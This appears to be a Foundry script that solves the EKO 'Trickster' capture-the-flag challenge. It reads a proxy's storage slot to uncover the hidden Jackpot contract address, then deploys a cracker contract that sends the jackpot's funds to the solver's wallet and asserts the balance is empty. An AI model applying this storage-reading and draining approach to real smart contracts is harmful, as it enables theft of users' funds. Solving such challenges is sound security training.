// SPDX-License-Identifier: AGPL-3.0-or-later
pragma solidity 0.8.17;

import { Script } from "forge-std/Script.sol";
import { JackpotProxy } from "eko/ChallengeTrickster.sol";
import { StdStorage, stdStorage } from "forge-std/StdStorage.sol";
import { TricksterCracker, Jackpot } from "../src/TricksterCracker.sol";

contract TricksterCrackerScript is Script {
  function run() external {
    Jackpot jackpot = Jackpot(
      payable(address(uint160(uint256(vm.load(vm.envAddress("JACKPOT_ADDRESS"), bytes32(uint256(1)))))))
    );

    vm.broadcast(vm.envAddress("ETH_FROM"));
    new TricksterCracker(jackpot, payable(vm.envAddress("WALLET_ADDRESS")));

    assert(address(jackpot).balance == 0);
  }
}
